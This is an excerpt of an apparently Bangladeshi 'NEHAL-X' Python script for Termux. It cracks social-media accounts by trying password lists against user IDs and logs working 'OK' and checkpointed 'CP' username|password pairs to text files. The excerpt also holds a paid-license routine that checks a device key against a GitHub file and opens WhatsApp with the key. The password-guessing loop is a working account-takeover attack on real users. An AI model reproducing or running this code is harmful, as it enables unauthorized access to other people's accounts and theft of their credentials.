...
def animate():
    ...
    for c in itertools.cycle(['\x1b[1;92m|', '\x1b[1;92m/', '\x1b[1;92m-', '\x1b[1;92m\\']):
        if done:
            break
        sys.stdout.write(f'\r{N}[{O}NEHAL-X{N}] Loading ' + c)
        sys.stdout.flush()
        time.sleep(0.03)
...
def logo():
 ...
 \033[1;92m 888o  88 88'     88   88 d8' `8b 88      
 \033[1;93m 88V8o 88 88ooooo 88ooo88 88ooo88 88      
 \033[1;91m 88 V8o88 88~~~~~ 88~~~88 88~~~88 88      
 \033[1;92m 88  V888 88.     88   88 88   88 88booo. 
 \033[1;93m VP   V8P Y88888P YP   YP YP   YP Y88888P
 \033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
...
def reg():
    ...
    time.sleep(1) 
    try:
        to = open('/sdcard/Android/.nehal.txt', 'r').read()
    except (KeyError, IOError):
        reg2()
    r = requests.get('https://github.com/weirdnehal/FUCK/blob/main/FUCK.txt').text
    if to in r:
        time.sleep(2)
        bsn_menu()
    else:
        ...
        print ('')
        print("\033[1;93m This Tool is paid you Need to get Approv First")
        print ('\033[1;37m Your Key : ' + to)
        print("\033[1;93m Copy and Send Key to Admin")
        name = input("\033[1;37m Your Name : ")
        ...
        os.system('am start https://wa.me/+8801613016943?text=' + tks)
        reg()
...
def reg2():
    ...
    print("\033[1;93m This Tool is paid you Need to get Approv First")
    print ('\033[1;37m Your Key : ' + id)
    print("\033[1;93m Copy and Send Key to Admin")
    name = input("\033[1;37m Your Name :      ")
    input('\033[1;97m Press Enter to Send Token')
    time.sleep(3.5)
    tks = 'Dear%20NEHAL-sir,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+id
    os.system('am start https://wa.me/+8801613016943?text=' + tks)
    sav = open('/sdcard/Android/.nehal.txt', 'w')
    sav.write(id)
    sav.close()
    reg()
...
class __bsn__:
    ...
    def __api__(self, user, __chi__):
        global ok,cp,loop
        for i in list('\|-/'):
            sys.stdout.write(f'\r [NEHAL] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
            sys.stdout.flush()
        for pw in __chi__:
            pw = pw.lower()
            ...
            if "access_token" in p:
                print('\r [OK-NEHAL] %s | %s ' % (user,pw))
                wrt = '%s|%s' % (user,pw)
                ok.append(wrt)
                open('NEHAL-ok.txt' , 'a').write('%s\n' % wrt)
                break
                ...
                try:
                    ...
                    print('\r%s \033[1;91m[CP-NEHAL] %s | %s ' % (K,user,pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
                    open('NEHAL-cp.txt' , 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
